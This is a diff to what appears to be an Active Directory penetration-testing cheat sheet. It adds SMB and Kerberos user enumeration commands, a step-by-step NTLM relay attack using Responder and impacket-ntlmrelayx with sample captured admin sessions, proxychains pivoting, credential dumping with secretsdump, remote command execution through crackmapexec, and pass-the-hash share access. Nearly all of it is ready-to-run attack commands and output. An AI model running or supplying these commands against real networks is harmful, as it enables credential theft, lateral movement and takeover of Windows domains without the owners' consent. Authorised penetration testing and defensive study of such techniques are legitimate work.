@@ -31,7 +31,7 @@ Options to bypass firewall `-f / -sS / -PN`
  This will enumerate anonymouss access to share. 
 
  ```bash
- cme smb <ip> -u 'a' -p '' # enumerate anonymous access
+ crackmapexec smb <ip> -u 'a' -p '' --shares
  ```
 - OSINT: you can use open source intelligence to get a list of valid usernames depending on various [active directory naming conventions](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
@@ -41,9 +41,11 @@ Options to bypass firewall `-f / -sS / -PN`
 - SMB: Enumerate anonymous and null session: 
 ```bash
 smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip>
+python3 smbmap.py --host-file smb-hosts.txt -d test.local -L
 ```
 - Once you craft a list of possible usernames, you can perform nmap kerberoas bruteforce to get valid ones:  
 ```bash
+kerbrute userenum -d test.local usernames.txt
 nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip> 
 ```
  * using crackmapexec: 
@@ -60,7 +62,55 @@ nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domai
   ```
 PS: Crackmapexec is prefered
 
-- [Perform SMB Relay]
+- [Perform SMB Relay] :
+
+### NTLM Relay attack #####
+
+ modify on responder file /etc/responder/Responder.conf
+SMB = Off  // Off instead of On
+HTTP = Off  // Off instead of On
+
+ Create a list of hosts within the environment with SMB signing disabled using crackmapexec
+
+```bash
+crackmapexec smb 172.19.0.0/16 --gen-relay-list targets.txt
+wc -l targets.txt
+```
+ Fire up responeder to capture hashes
+
+ ```bash
+responder -I eth1 -r -d -w
+```
+ then fire up ntlmrelayx script to relay those hashes
+
+ ```bash
+impacket-ntlmrelayx -tf targets.txt -smb2support -debug -socks
+```
+ After a while u can check ntlmrelayx if any session was captured
+ntlmrelayx> socks
+Protocol  Target         Username         AdminStatus  Port 
+--------  -------- 	 --------         --------     ------
+SMB       192.168.1.9    DOM/alice_admin  TRUE         445
+SMB       192.168.1.16   DOM/alice_admin  TRUE         445
+SMB       192.168.1.17   DOM/alice_admin  TRUE         445
+SMB       192.168.1.13   DOM/alice_admin  TRUE         445
+SMB       192.168.1.31   DOM/alice_admin  TRUE         445
+
+
+ use proxychains to interact with ntlmrelayx socks fonctionality (1080 is the default port within ntlmrelayx)
+nano /etc/proxychains.conf
+[ProxyList]
+socks4  127.0.0.1 1080
+
+
+ Now you can basically do what ever with those sessions
+
+  ```bash
+proxychains impacket-smbclient -no-pass DOM/alice_admin@192.168.1.41
+proxychains impacket-secretsdump DOM/alice_admin@192.168.1.4
+impacket-secretsdump DOM/bob_admin@192.168.1.8
+crackmapexec smb 192.168.1.10 -u dom_admin -p dom_admin_password -x whoami
+```
 
 
 With credentials 
@@ -72,6 +122,24 @@ Use the credentials in you favor enumerate usefull information you might you use
  ```bash
  crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
  ```
+
+ ##### SMB SHARES #####
+
+```bash
+without credentials : smbclient -L 172.16.1.0 
+
+without credentials access : smbclient  \\\\172.16.1.0\\$share
+
+with credentials : smbclient -L 172.16.1.0  -U=user%password
+
+with credentials access : smbclient \\\\172.16.1.0\\$share  -U=user%password
+
+with ntlm access : smbclient \\\\172.16.1.0\\$share -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
+
+mount smb share : sudo mkdir /tmp/data; sudo mount -t cifs -o 'user=USER,password=PASSWORD' //10.0.2.80/shareapp /tmp/data
+```
+
+
 - Find computers you can login to. 
 
 Enumerate following:
@@ -81,5 +149,6 @@ Enumerate following:
 − Domain Administrators
 − Enterprise Administrators
 − Shares
+
 
 
